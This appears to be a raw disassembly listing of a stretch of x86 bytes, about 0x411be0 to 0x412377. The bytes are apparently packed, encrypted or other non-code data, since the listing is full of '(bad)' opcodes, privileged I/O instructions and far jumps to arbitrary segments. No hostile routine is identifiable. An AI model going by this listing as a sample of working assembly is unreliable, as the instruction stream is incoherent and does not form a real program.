  411be0:	add    eax,0x98e32eeb
  411be5:	retf   
  411be6:	mov    al,ds:0xb6055bad
  411beb:	loope  0x411b7a
  411bed:	iret   
  411bee:	iret   
  411bef:	sub    BYTE PTR [edi+0x294f1bdd],0x19
  411bf6:	aas    
  411bf7:	lahf   
  411bf8:	push   cs
  411bf9:	icebp  
  411bfa:	or     al,0xfd
  411bfc:	call   0x137:0xc7c220f1
  411c03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c04:	mov    ah,0x5
  411c06:	xor    al,0x17
  411c08:	jnp    0x411c16
  411c0a:	or     al,0x6b
  411c0c:	repnz es (bad) 
  411c0f:	xlat   BYTE PTR ds:[ebx]
  411c10:	pop    ss
  411c11:	xor    DWORD PTR [edx+0x9],eax
  411c14:	shr    DWORD PTR [esi-0x1799878e],0x35
  411c1b:	pop    es
  411c1c:	(bad)  
  411c1d:	cs inc esi
  411c1f:	lds    edi,FWORD PTR [edi+0x10]
  411c22:	sub    dl,BYTE PTR [ecx]
  411c24:	test   DWORD PTR [esi+0x20b38cd1],ebp
  411c2a:	mov    ebx,DWORD PTR [edi-0x7cbddb32]
  411c30:	leave  
  411c31:	sti    
  411c32:	xlat   BYTE PTR ds:[ebx]
  411c33:	inc    edi
  411c34:	les    edx,FWORD PTR [ecx]
  411c36:	adc    eax,0x55d30a79
  411c3b:	push   0x63
  411c3d:	or     DWORD PTR [edi-0x35],edi
  411c40:	and    al,0x6c
  411c42:	nop
  411c43:	js     0x411bf9
  411c45:	and    bl,bh
  411c47:	sar    BYTE PTR [ebp+0x47],cl
  411c4a:	clc    
  411c4b:	stos   BYTE PTR es:[edi],al
  411c4c:	mov    ecx,edx
  411c4e:	adc    bh,bh
  411c50:	and    ecx,eax
  411c52:	sub    eax,DWORD PTR [ebx-0x4d]
  411c55:	push   esp
  411c56:	ds xchg ebp,eax
  411c58:	xor    edi,edx
  411c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c5b:	adc    al,0x26
  411c5d:	fadd   DWORD PTR [ebx-0x24]
  411c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c61:	add    BYTE PTR [ebx],bl
  411c63:	(bad)  [eax+0x74b330f8]
  411c69:	gs xchg esi,eax
  411c6b:	scas   al,BYTE PTR es:[edi]
  411c6c:	pop    esp
  411c6d:	f2xm1  
  411c6f:	int3   
  411c70:	xchg   esp,eax
  411c71:	imul   esi,edx,0x4562f446
  411c77:	daa    
  411c78:	icebp  
  411c79:	call   DWORD PTR [edx+0xd]
  411c7c:	ficom  WORD PTR [ebp+0x321d67c1]
  411c82:	pop    edx
  411c83:	or     ah,dl
  411c85:	fndisi(8087 only) 
  411c87:	jp     0x411c70
  411c89:	in     al,0x19
  411c8b:	push   ss
  411c8c:	mul    BYTE PTR [esi+eax*2+0x34]
  411c90:	add    al,BYTE PTR [ebx]
  411c92:	xor    dh,ah
  411c94:	jno    0x411c85
  411c96:	add    DWORD PTR [esi+0x54e5020c],0xd42a231e
  411ca0:	lods   eax,DWORD PTR ds:[esi]
  411ca1:	cmp    ch,BYTE PTR [ebx]
  411ca3:	or     al,0x4f
  411ca5:	fcomi  st,st(6)
  411ca7:	mov    ebx,0x12bf24ed
  411cac:	ja     0x411cc6
  411cae:	cmp    ebp,ecx
  411cb0:	ficom  DWORD PTR [esi]
  411cb2:	xchg   esi,eax
  411cb3:	mov    eax,0x943cc464
  411cb8:	stc    
  411cb9:	in     eax,dx
  411cba:	add    al,0xaa
  411cbc:	std    
  411cbd:	push   eax
  411cbe:	je     0x411c5f
  411cc0:	add    bl,ch
  411cc2:	sahf   
  411cc3:	outs   dx,DWORD PTR ds:[esi]
  411cc4:	jns    0x411cb2
  411cc6:	mov    WORD PTR [ebp-0xe],ds
  411cc9:	out    0x91,eax
  411ccb:	dec    edi
  411ccc:	mov    ebx,0x9fc7a80
  411cd1:	xchg   esp,eax
  411cd2:	and    DWORD PTR [ebp-0x319f149a],ebx
  411cd8:	and    ebx,DWORD PTR [esi-0x1cebe1e5]
  411cde:	cmp    cl,BYTE PTR [edi-0x47]
  411ce1:	cmp    ebp,DWORD PTR [eax+0x6c]
  411ce4:	jp     0x411d3c
  411ce6:	jne    0x411cb5
  411ce8:	lgs    eax,FWORD PTR [ecx+0x4c]
  411cec:	and    eax,0x2ad1ee85
  411cf1:	adc    eax,DWORD PTR [edi+edi*2-0x678e7325]
  411cf8:	push   ds
  411cf9:	sbb    DWORD PTR [edi],esi
  411cfb:	js     0x411d4b
  411cfd:	sar    DWORD PTR [edi],1
  411cff:	mov    bh,0xf3
  411d01:	push   eax
  411d02:	pop    ebx
  411d03:	fistp  WORD PTR [edi-0x6a]
  411d06:	sbb    ch,BYTE PTR [edi+0x27d39f70]
  411d0c:	sahf   
  411d0d:	test   ch,0x73
  411d10:	dec    ecx
  411d11:	or     DWORD PTR [esi+0x1e],0x7
  411d15:	sar    BYTE PTR [ecx],cl
  411d17:	push   0x761104ad
  411d1c:	mov    ah,0x7
  411d1e:	xchg   esi,eax
  411d1f:	mov    eax,ds:0x95f718f2
  411d24:	test   al,0xd8
  411d26:	sub    eax,0xec8b10c3
  411d2b:	and    eax,0x8b622caf
  411d30:	mov    WORD PTR gs:[esp+ecx*8],ds
  411d34:	out    dx,eax
  411d35:	pop    es
  411d36:	cmc    
  411d37:	ja     0x411cb9
  411d39:	cli    
  411d3a:	mov    eax,ds:0x461984fc
  411d3f:	pop    ss
  411d40:	repz aam 0x86
  411d43:	mov    dl,0x86
  411d45:	adc    ah,cl
  411d47:	push   eax
  411d48:	jno    0x411d30
  411d4a:	push   edx
  411d4b:	retf   
  411d4c:	cmp    BYTE PTR [edx],ah
  411d4e:	mov    dl,BYTE PTR [esi]
  411d50:	sub    ah,0xee
  411d53:	div    DWORD PTR [ebx+0x16]
  411d56:	push   0x6199d023
  411d5b:	dec    edi
  411d5c:	repz popf 
  411d5e:	out    0x9b,al
  411d60:	xchg   ecx,eax
  411d61:	fcom   QWORD PTR [edi+0x47]
  411d64:	pusha  
  411d65:	adc    al,0x4
  411d67:	jmp    0x3f89:0x8fdb4e11
  411d6e:	jmp    0x411dd4
  411d70:	retf   
  411d71:	mov    al,0xee
  411d73:	in     al,dx
  411d74:	pop    ss
  411d75:	aas    
  411d76:	outs   dx,BYTE PTR ds:[esi]
  411d77:	popa   
  411d78:	push   ss
  411d79:	test   BYTE PTR ds:0xf56cb7cf,dl
  411d7f:	jecxz  0x411d12
  411d81:	push   esp
  411d82:	into   
  411d83:	or     ebp,DWORD PTR [eax+0x2]
  411d86:	enter  0x6096,0x37
  411d8a:	cmp    BYTE PTR [edi+ebx*1-0xc79180e],ah
  411d91:	jnp    0x411d25
  411d93:	xchg   ecx,eax
  411d94:	aas    
  411d95:	jno    0x411d7a
  411d97:	jne    0x411d67
  411d99:	dec    esi
  411d9a:	or     edi,DWORD PTR [ecx]
  411d9c:	mov    bh,0x23
  411d9e:	sub    DWORD PTR [edx+edx*1],ebp
  411da1:	fs cdq 
  411da3:	test   BYTE PTR ds:[esi+0x57],ch
  411da7:	dec    eax
  411da8:	lock push esi
  411daa:	addr16 jb 0x411dff
  411dad:	cmp    ebp,DWORD PTR [eax]
  411daf:	xor    bl,dl
  411db1:	inc    esp
  411db2:	mov    cl,0xf8
  411db4:	int3   
  411db5:	push   ecx
  411db6:	mov    bl,0x35
  411db8:	jb     0x411dcb
  411dba:	je     0x411d4f
  411dbc:	mov    cl,BYTE PTR [edi+0x4f]
  411dbf:	adc    al,bh
  411dc1:	sbb    bh,BYTE PTR [ebx+eax*2+0x2ebe691]
  411dc8:	adc    bl,BYTE PTR [ebx+0x10]
  411dcb:	cwde   
  411dcc:	in     eax,dx
  411dcd:	add    eax,0xdf68cfe2
  411dd2:	int    0x41
  411dd4:	fld    QWORD PTR [eax+0x1800fdcf]
  411dda:	push   0xce0ab13
  411ddf:	retf   
  411de0:	ins    DWORD PTR es:[edi],dx
  411de1:	push   esp
  411de2:	mov    cl,BYTE PTR [edx+0x3a]
  411de5:	xchg   ecx,eax
  411de6:	jno    0x411de7
  411de8:	pop    ebp
  411de9:	sub    eax,0xb0489e2d
  411dee:	lds    esi,FWORD PTR [esi-0x77]
  411df1:	repz pop eax
  411df3:	jo     0x411dfe
  411df5:	jle    0x411e65
  411df7:	dec    ebp
  411df8:	nop
  411df9:	jge    0x411e2e
  411dfb:	pop    ecx
  411dfc:	xchg   edi,eax
  411dfd:	add    cl,BYTE PTR [ebp+0x24]
  411e00:	stc    
  411e01:	sbb    eax,0xf401a8a
  411e06:	lahf   
  411e07:	test   BYTE PTR [edx-0x67],dh
  411e0a:	mov    BYTE PTR [ebx-0xf],dh
  411e0d:	(bad)  
  411e0e:	mov    ds:0xa7ea979f,al
  411e13:	add    edx,DWORD PTR [edi+0x5d]
  411e16:	sbb    ebx,DWORD PTR [ecx]
  411e18:	or     dh,bh
  411e1a:	loope  0x411dcc
  411e1c:	ss out dx,al
  411e1e:	ror    BYTE PTR [edx+0x50819156],1
  411e24:	cmp    ch,BYTE PTR [edx]
  411e26:	loope  0x411db6
  411e28:	mov    bh,0xd1
  411e2a:	not    DWORD PTR [edi-0x48]
  411e2d:	or     bl,BYTE PTR [edi]
  411e2f:	imul   esi,DWORD PTR [ebp+0x64],0xffffffb1
  411e33:	cld    
  411e34:	es jns 0x411eac
  411e37:	out    dx,eax
  411e38:	pop    ebx
  411e39:	xchg   esi,eax
  411e3a:	fistp  QWORD PTR [edx]
  411e3c:	hlt    
  411e3d:	mov    ch,0x6a
  411e3f:	mov    BYTE PTR [edi],0x60
  411e42:	sub    eax,0x4b2791ab
  411e47:	dec    ebx
  411e48:	test   DWORD PTR [edi-0x6],edi
  411e4b:	movzx  ebx,BYTE PTR [ecx-0x4ac68ed7]
  411e52:	ins    BYTE PTR es:[edi],dx
  411e53:	xlat   BYTE PTR ds:[ebx]
  411e54:	(bad)  
  411e55:	nop
  411e56:	in     eax,0xe8
  411e58:	inc    edx
  411e59:	sub    DWORD PTR [edi-0x21bf1766],ebp
  411e5f:	ins    BYTE PTR es:[edi],dx
  411e60:	scas   eax,DWORD PTR es:[edi]
  411e61:	hlt    
  411e62:	push   ss
  411e63:	inc    esi
  411e64:	xchg   DWORD PTR ds:0x177146b9,edi
  411e6a:	xor    esi,esi
  411e6c:	mov    al,BYTE PTR [edi-0x2f]
  411e6f:	and    al,ch
  411e71:	retf   
  411e72:	repnz ins DWORD PTR es:[edi],dx
  411e74:	je     0x411e9d
  411e76:	pop    edx
  411e77:	mov    edx,0xaa616250
  411e7c:	inc    ecx
  411e7d:	cmp    al,BYTE PTR [ebp-0x25]
  411e80:	mov    ebp,0xf2754662
  411e85:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e87:	stos   BYTE PTR es:[edi],al
  411e88:	mov    ebx,0xced27ba8
  411e8d:	test   eax,0x364b6691
  411e92:	bound  ebp,QWORD PTR [esi*8-0x3e851f22]
  411e99:	mov    al,ds:0xe62719d5
  411e9e:	mov    ebx,0x46589714
  411ea3:	stos   BYTE PTR es:[edi],al
  411ea4:	xor    eax,0x29221893
  411ea9:	jae    0x411e6e
  411eab:	add    esi,esi
  411ead:	inc    edx
  411eae:	pushf  
  411eaf:	(bad)  
  411eb0:	mov    esp,0x7d7c6ba8
  411eb5:	into   
  411eb6:	and    eax,ebp
  411eb8:	fadd   QWORD PTR [edi]
  411eba:	add    eax,DWORD PTR [edx-0x4ad67fc3]
  411ec0:	sti    
  411ec1:	arpl   sp,di
  411ec3:	mov    ax,0xb9a1
  411ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec8:	mov    ds:0x277fa315,al
  411ecd:	cld    
  411ece:	(bad)  
  411ecf:	mov    edi,0x7deaf13e
  411ed4:	mov    al,ds:0x84f06b8b
  411ed9:	(bad)  
  411eda:	jmp    0xe78f:0x7ecfda57
  411ee1:	or     eax,0x1a01449
  411ee6:	stos   BYTE PTR es:[edi],al
  411ee7:	add    bh,bh
  411ee9:	(bad)  
  411eea:	cwde   
  411eeb:	fldcw  WORD PTR [edi-0x560207a4]
  411ef1:	cmp    DWORD PTR [eax],edi
  411ef3:	and    edx,DWORD PTR [edi+0x550b18b1]
  411ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411efa:	popa   
  411efb:	inc    esi
  411efc:	mov    edi,0x52caf5ec
  411f01:	and    al,0xe5
  411f03:	push   cs
  411f04:	js     0x411ec1
  411f06:	sbb    eax,0xacc88486
  411f0b:	pop    ecx
  411f0c:	test   eax,0x90df3487
  411f11:	call   0xffb1:0x89d56ef9
  411f18:	xchg   ecx,eax
  411f19:	mov    bh,0x2e
  411f1b:	mov    al,bl
  411f1d:	out    dx,al
  411f1e:	cwd    
  411f20:	xor    eax,0x2949a623
  411f25:	mov    WORD PTR [edi+eiz*4-0x5bc00d2f],?
  411f2c:	es jmp 0x411efc
  411f2f:	outs   dx,DWORD PTR ds:[esi]
  411f30:	stos   BYTE PTR es:[edi],al
  411f31:	pop    ebp
  411f32:	add    al,0x83
  411f34:	(bad)  
  411f35:	out    dx,eax
  411f36:	sbb    ah,dh
  411f38:	push   eax
  411f39:	mov    dh,BYTE PTR [esi+edi*8]
  411f3c:	push   ss
  411f3d:	jle    0x411f9e
  411f3f:	inc    ecx
  411f40:	mov    dl,0x11
  411f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f43:	js     0x411f84
  411f45:	xchg   edi,eax
  411f46:	pop    ebp
  411f47:	cmp    DWORD PTR [esi-0x7f6a2b09],esp
  411f4d:	sub    eax,esp
  411f4f:	scas   al,BYTE PTR es:[edi]
  411f50:	xchg   esp,edx
  411f52:	xchg   esp,eax
  411f53:	jmp    0xc2977c94
  411f58:	dec    eax
  411f59:	lods   eax,DWORD PTR ds:[esi]
  411f5a:	push   ecx
  411f5b:	iret   
  411f5c:	inc    eax
  411f5d:	das    
  411f5e:	mov    dh,0xce
  411f60:	inc    ebp
  411f61:	xor    al,0xdf
  411f63:	jmp    0xb6a1:0xb1646909
  411f6a:	stc    
  411f6b:	rol    DWORD PTR [eax],cl
  411f6d:	fdivr  st(4),st
  411f6f:	dec    eax
  411f70:	mov    WORD PTR [eax],ds
  411f72:	frstor [ecx+0x20e1a82]
  411f78:	imul   ebx,edi,0x65
  411f7b:	(bad)  
  411f7c:	dec    edi
  411f7d:	add    bl,BYTE PTR [edx+0x45cffa6b]
  411f83:	leave  
  411f84:	pop    es
  411f85:	call   0xe239026d
  411f8a:	fwait
  411f8b:	sub    dl,ah
  411f8d:	scas   al,BYTE PTR es:[edi]
  411f8e:	jno    0x411fd9
  411f90:	stos   BYTE PTR es:[edi],al
  411f91:	cmp    dl,dl
  411f93:	in     eax,0x22
  411f95:	mov    esi,ebp
  411f97:	mov    ah,0x56
  411f99:	jae    0x411f85
  411f9b:	aaa    
  411f9c:	and    ebx,DWORD PTR [ebx]
  411f9e:	cmp    eax,0xb42c5035
  411fa3:	xor    ch,BYTE PTR [edi+edi*1+0x2f]
  411fa7:	xlat   BYTE PTR ds:[ebx]
  411fa8:	loope  0x411f93
  411faa:	aaa    
  411fab:	cmp    esp,DWORD PTR [ecx+0x2c7dd64a]
  411fb1:	pop    eax
  411fb2:	gs es xchg esi,eax
  411fb5:	or     esp,edi
  411fb7:	aam    0xb1
  411fb9:	xor    DWORD PTR [eax+edi*1-0x52bfa8ef],edx
  411fc0:	sub    DWORD PTR ds:0x530b36d4,ecx
  411fc6:	retf   
  411fc7:	xchg   edx,eax
  411fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc9:	inc    esp
  411fca:	addr16 and ax,0x8bc2
  411fcf:	fcmovnbe st,st(5)
  411fd1:	pop    eax
  411fd2:	rcr    BYTE PTR [ebp-0x2998d5bc],1
  411fd8:	loop   0x41203f
  411fda:	out    dx,eax
  411fdb:	cs cmp dh,dh
  411fde:	gs add esp,DWORD PTR cs:[edx]
  411fe2:	(bad)  
  411fe3:	jle    0x411fec
  411fe5:	test   al,0x12
  411fe7:	das    
  411fe8:	loop   0x412051
  411fea:	ss push cs
  411fec:	imul   eax,DWORD PTR [eax],0x68
  411fef:	mov    cl,0xa7
  411ff1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff2:	cmp    al,0x14
  411ff4:	and    BYTE PTR [esi-0x53c7dfc3],0x8f
  411ffb:	push   edx
  411ffc:	push   edi
  411ffd:	fwait
  411ffe:	xor    DWORD PTR [edi],esi
  412000:	and    esp,eax
  412002:	push   ds
  412003:	ret    
  412004:	jo     0x412082
  412006:	inc    ecx
  412007:	ror    DWORD PTR [eax-0x12],0xe7
  41200b:	push   esi
  41200c:	fwait
  41200d:	popf   
  41200e:	fldenv [edi+0x238fe31d]
  412014:	sub    edx,ecx
  412016:	dec    ebp
  412017:	pop    ds
  412018:	aas    
  412019:	jl     0x412019
  41201b:	les    ebp,FWORD PTR [edi]
  41201d:	repz jns 0x411fba
  412020:	shl    BYTE PTR [esp+edx*4],cl
  412023:	imul   ebx,DWORD PTR [edi+0x1e],0xffffffeb
  412027:	and    esi,DWORD PTR [ebp+ebx*2+0x5]
  41202b:	cld    
  41202c:	push   0x626b3dc9
  412031:	mov    al,0x32
  412033:	popf   
  412034:	fidivr DWORD PTR [esi-0x651a4c35]
  41203a:	les    ecx,FWORD PTR [edx+0x70]
  41203d:	ds loope 0x411fc6
  412040:	fwait
  412041:	xchg   DWORD PTR [ecx+0x46678722],esp
  412047:	(bad)  
  412048:	out    0x50,al
  41204a:	cmp    DWORD PTR [edi],esi
  41204c:	inc    edx
  41204d:	js     0x4120b2
  41204f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412050:	ret    0x9580
  412053:	cld    
  412054:	lock inc ebx
  412056:	mov    al,ds:0x9752b77
  41205b:	les    esi,FWORD PTR [ebx-0x43871192]
  412061:	xchg   DWORD PTR [ebx+0x188fab0],esp
  412067:	loope  0x41206d
  412069:	les    ebp,FWORD PTR [esp+edx*4-0x4a]
  41206d:	je     0x4120c2
  41206f:	cmp    eax,0xdd667ef3
  412074:	cld    
  412075:	sub    esp,ebx
  412077:	mov    ch,0x0
  412079:	xor    dh,BYTE PTR [edx-0x70d82e5]
  41207f:	out    0x9b,eax
  412081:	jno    0x4120d2
  412083:	loop   0x4120c1
  412085:	cmp    edi,DWORD PTR [eax+0x40]
  412088:	out    dx,eax
  412089:	cs stos DWORD PTR es:[edi],eax
  41208b:	mov    dh,0xc7
  41208d:	mov    eax,0x385e2de1
  412092:	sbb    DWORD PTR [ecx+0x335383b],edx
  412098:	in     eax,0x93
  41209a:	arpl   WORD PTR [ecx+0xa],di
  41209d:	mov    ah,0x43
  41209f:	push   cs
  4120a0:	mov    ebp,0xfe0d42a5
  4120a5:	das    
  4120a6:	jge    0x41208f
  4120a8:	mov    cl,0xc3
  4120aa:	push   ecx
  4120ab:	sbb    ch,BYTE PTR [ecx+ecx*2+0x784384ba]
  4120b2:	adc    DWORD PTR [ebp-0x39846df3],0xfffffff4
  4120b9:	inc    ebx
  4120ba:	jnp    0x41209e
  4120bc:	mov    BYTE PTR [ebp-0xc],ch
  4120bf:	mov    dl,0x6d
  4120c1:	jns    0x412096
  4120c3:	int    0xf8
  4120c5:	nop
  4120c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120c7:	loop   0x41212e
  4120c9:	(bad)  
  4120ca:	jmp    0x76f4:0xde1d7dc6
  4120d1:	fs popf 
  4120d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120d4:	fadd   QWORD PTR ds:0xc50530e1
  4120da:	mov    ds:0x73ac855,eax
  4120df:	test   BYTE PTR es:0xd165dd3a,dl
  4120e6:	dec    esi
  4120e7:	pushf  
  4120e8:	jae    0x4120f8
  4120ea:	sbb    al,0x11
  4120ec:	mov    esi,0x3873474d
  4120f1:	inc    ecx
  4120f2:	lahf   
  4120f3:	arpl   WORD PTR [esp+esi*2],bp
  4120f6:	sbb    eax,eax
  4120f8:	test   BYTE PTR [ebx-0x26333e31],dl
  4120fe:	sub    edx,DWORD PTR [ecx+eiz*1-0x6140c5d9]
  412105:	dec    esi
  412106:	and    eax,0xa3afface
  41210b:	ret    0x6b83
  41210e:	sub    eax,0xa8d34a79
  412113:	jle    0x4120ec
  412115:	fisub  WORD PTR [esi+0x54]
  412118:	mov    WORD PTR [ecx-0x2232806f],cs
  41211e:	or     BYTE PTR [edx+0x21],0x7f
  412122:	mov    ebx,0x9275497
  412127:	or     ecx,DWORD PTR [edi]
  412129:	mov    eax,0x98ea6a58
  41212e:	loopne 0x412104
  412130:	jl     0x41211e
  412132:	enter  0x6d43,0xfc
  412136:	fidiv  WORD PTR [ecx]
  412138:	push   0xffffffd0
  41213a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41213b:	aam    0x8a
  41213d:	arpl   WORD PTR [esp+edi*8],dx
  412140:	jge    0x4120f1
  412142:	cmp    eax,0x7b4b9d1d
  412147:	xchg   ecx,eax
  412148:	(bad)  
  412149:	cmp    eax,0xd996b1c
  41214e:	mov    dh,0xa8
  412150:	push   ebp
  412151:	cmp    eax,0x1382b183
  412156:	xchg   ebx,eax
  412157:	hlt    
  412158:	int    0x47
  41215a:	sub    eax,0xbb894a0e
  41215f:	pop    esi
  412160:	loop   0x41210b
  412162:	or     al,0x23
  412164:	aam    0x24
  412166:	cmp    ecx,ebp
  412168:	inc    ebp
  412169:	dec    edi
  41216a:	inc    eax
  41216b:	retf   0xac5e
  41216e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41216f:	jl     0x41216d
  412171:	jb     0x41218b
  412173:	push   eax
  412174:	dec    esp
  412175:	xchg   ebx,eax
  412176:	aaa    
  412177:	sahf   
  412178:	arpl   sp,ax
  41217a:	push   esp
  41217b:	jmp    0x4735:0x8d2daf8b
  412182:	push   ss
  412183:	sbb    ecx,DWORD PTR [edi+esi*8]
  412186:	stos   DWORD PTR es:[edi],eax
  412187:	cmp    DWORD PTR [edx+0x48],edi
  41218a:	and    eax,0x8d0e72df
  41218f:	mov    eax,ds:0x8e53b91b
  412194:	inc    ebx
  412195:	mov    edi,0x56bdf4e6
  41219a:	mov    ds:0x646d73f6,eax
  41219f:	pop    ecx
  4121a0:	(bad)  
  4121a1:	lods   eax,DWORD PTR ds:[esi]
  4121a2:	mov    eax,ds:0xb33660ac
  4121a7:	sbb    al,BYTE PTR [esi-0x55fa738e]
  4121ad:	mov    ah,0x87
  4121af:	sub    BYTE PTR [ebx-0x1e],bl
  4121b2:	popf   
  4121b3:	in     eax,0xd
  4121b5:	pop    ebp
  4121b6:	push   ecx
  4121b7:	jno    0x412160
  4121b9:	xchg   DWORD PTR [esi+0x1],ebx
  4121bc:	das    
  4121bd:	test   al,0xe9
  4121bf:	xor    esi,DWORD PTR [esi-0x11]
  4121c2:	push   edi
  4121c3:	sub    DWORD PTR [ecx],ebx
  4121c5:	out    dx,eax
  4121c6:	xor    al,0x8f
  4121c9:	rcr    ecx,cl
  4121cb:	sbb    cl,BYTE PTR [ecx]
  4121cd:	inc    ecx
  4121ce:	out    dx,al
  4121cf:	xchg   edi,eax
  4121d0:	and    DWORD PTR [ebx],edx
  4121d2:	idiv   DWORD PTR [ebx-0x69]
  4121d5:	sbb    DWORD PTR [ebx-0x4d],ebp
  4121d8:	leave  
  4121d9:	das    
  4121da:	pop    ebp
  4121db:	loope  0x412171
  4121dd:	popf   
  4121de:	mov    ebp,0x836e6b60
  4121e3:	shr    DWORD PTR [edi+ebp*1+0x24],0x43
  4121e8:	adc    DWORD PTR [edi-0x6],esp
  4121eb:	xchg   ecx,eax
  4121ec:	ror    BYTE PTR ds:0x4ada692b,1
  4121f2:	xchg   ebp,eax
  4121f3:	and    al,0x5f
  4121f5:	mov    ds:0x38fa85fd,eax
  4121fa:	adc    DWORD PTR [edi+0x77],ebp
  4121fd:	icebp  
  4121fe:	or     al,0xa3
  412200:	mov    al,0x99
  412202:	je     0x4121a1
  412204:	adc    eax,0x83ab8097
  412209:	outs   dx,DWORD PTR ds:[esi]
  41220a:	xor    ch,dl
  41220c:	add    DWORD PTR [eax+ebp*1-0x9391baa],ecx
  412213:	hlt    
  412214:	call   0x24e7:0xe03d98ff
  41221b:	fs (bad) 
  41221e:	stc    
  41221f:	adc    eax,0x6e33f39a
  412224:	fidivr WORD PTR [esp+eiz*8]
  412227:	out    0x79,al
  412229:	hlt    
  41222a:	test   dh,al
  41222c:	sub    edx,DWORD PTR [ebp+eax*8-0x5c]
  412230:	push   ebp
  412231:	bound  edx,QWORD PTR [ecx]
  412233:	into   
  412234:	(bad)  
  412235:	sbb    DWORD PTR [edx],edx
  412237:	gs repnz inc edx
  41223a:	dec    edx
  41223b:	in     eax,0x54
  41223d:	jbe    0x412293
  41223f:	mov    ch,0x80
  412241:	mov    al,ds:0xdf9e26f6
  412246:	dec    eax
  412247:	push   ss
  412248:	mov    ecx,0x3019fa60
  41224d:	or     DWORD PTR [esi-0x67],edi
  412250:	adc    BYTE PTR [edx],0x83
  412253:	cld    
  412254:	add    esp,ebp
  412256:	adc    esp,DWORD PTR [ebx-0x36]
  412259:	jns    0x41229e
  41225b:	les    ebx,FWORD PTR [edx-0x3f655b0f]
  412261:	and    DWORD PTR [ebx+ebp*8-0x27071245],ebp
  412268:	mov    ds:0xf2efbcf3,al
  41226d:	sbb    al,0xb2
  41226f:	cdq    
  412270:	cmp    bl,BYTE PTR gs:[esi]
  412273:	sti    
  412274:	stos   BYTE PTR es:[edi],al
  412275:	fs stc 
  412277:	out    0x84,eax
  412279:	call   0x6b3d:0x182f0e2f
  412280:	inc    esp
  412281:	js     0x412281
  412283:	ins    BYTE PTR es:[edi],dx
  412284:	(bad)  
  412286:	pusha  
  412287:	int    0xd1
  412289:	xor    BYTE PTR [esi+0x59],ah
  41228c:	push   esi
  41228d:	and    al,0xff
  41228f:	lods   al,BYTE PTR ds:[esi]
  412290:	cmp    BYTE PTR [esi+0x5a652ebe],al
  412296:	add    ebx,ecx
  412298:	addr16 pop esp
  41229a:	jg     0x412315
  41229c:	and    bh,BYTE PTR [esi]
  41229e:	cmp    ecx,DWORD PTR [eax+0x4730c59c]
  4122a4:	je     0x41223f
  4122a6:	xchg   ecx,eax
  4122a7:	loop   0x41229f
  4122a9:	je     0x412243
  4122ab:	dec    eax
  4122ac:	call   0x1eaf566
  4122b1:	jae    0x41231f
  4122b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b4:	and    DWORD PTR [ebx],0x864410a
  4122ba:	and    ah,BYTE PTR [esi+0x10e81d81]
  4122c0:	and    eax,0x5f71f29d
  4122c5:	jge    0x4122c1
  4122c7:	jbe    0x41229b
  4122c9:	sbb    al,0x71
  4122cb:	aam    0x90
  4122cd:	stos   DWORD PTR es:[edi],eax
  4122ce:	pop    ebx
  4122cf:	jne    0x412330
  4122d1:	cdq    
  4122d2:	pop    eax
  4122d3:	lea    ecx,[edi+0x4248e2e7]
  4122d9:	test   DWORD PTR [ebx-0x7116e8c7],esi
  4122df:	sahf   
  4122e0:	cmp    al,0xbd
  4122e2:	ja     0x412296
  4122e4:	adc    eax,0x27bfc841
  4122e9:	dec    ebp
  4122ea:	lods   eax,DWORD PTR ds:[esi]
  4122eb:	jnp    0x412284
  4122ed:	inc    ebp
  4122ee:	rcl    BYTE PTR [eax-0x48210c45],cl
  4122f4:	cmp    al,0x5a
  4122f6:	pop    esp
  4122f7:	ret    0x6f21
  4122fa:	addr16 addr16 daa 
  4122fd:	(bad)  
  4122fe:	into   
  4122ff:	daa    
  412300:	add    al,BYTE PTR [ebp-0x6b8f4dbb]
  412306:	in     al,0x41
  412308:	stos   BYTE PTR es:[edi],al
  412309:	test   BYTE PTR [esi+0x55],0x35
  41230d:	enter  0xc143,0xf2
  412311:	pop    ebp
  412312:	push   esp
  412313:	mov    cl,0xd2
  412315:	cli    
  412316:	in     al,0x6f
  412318:	adc    DWORD PTR [edi+ebx*8-0x6e23a48b],eax
  41231f:	push   ss
  412320:	xor    DWORD PTR [esi+eax*8-0x8],ecx
  412324:	add    ch,BYTE PTR [eax]
  412326:	stos   DWORD PTR es:[edi],eax
  412327:	cmp    eax,esp
  412329:	xchg   esi,eax
  41232a:	mov    WORD PTR [edi+0x2c],ds
  41232d:	xor    al,0xb6
  41232f:	lods   al,BYTE PTR ds:[esi]
  412330:	or     BYTE PTR [edi],cl
  412332:	lods   eax,DWORD PTR ds:[esi]
  412333:	lods   al,BYTE PTR ds:[esi]
  412334:	aad    0xb9
  412336:	push   0x22
  412338:	outs   dx,BYTE PTR ds:[esi]
  412339:	inc    eax
  41233a:	enter  0x42b9,0x12
  41233e:	jns    0x412300
  412340:	stos   DWORD PTR es:[edi],eax
  412341:	sbb    DWORD PTR [ebx],edx
  412343:	test   BYTE PTR [ecx],0x85
  412346:	sbb    dh,BYTE PTR [eax-0x6d]
  412349:	push   edx
  41234a:	add    al,BYTE PTR [edx*1+0x2e13ef55]
  412351:	hlt    
  412352:	mov    bh,0xbf
  412354:	dec    esi
  412355:	xor    al,0x84
  412357:	pop    eax
  412358:	xlat   BYTE PTR ds:[ebx]
  412359:	xacquire xchg BYTE PTR [esi],ch
  41235c:	jne    0x4122e2
  41235e:	xchg   ecx,eax
  41235f:	loopne 0x4123df
  412361:	xchg   ebx,eax
  412362:	mov    eax,ds:0x4698921b
  412367:	mov    ds:0x205b30a8,eax
  41236c:	shr    BYTE PTR [esp+edx*2],0x92
  412370:	retf   
  412371:	mov    ds:0x8b0f865,eax
  412376:	stos   BYTE PTR es:[edi],al
  412377:	mov    al,0xd
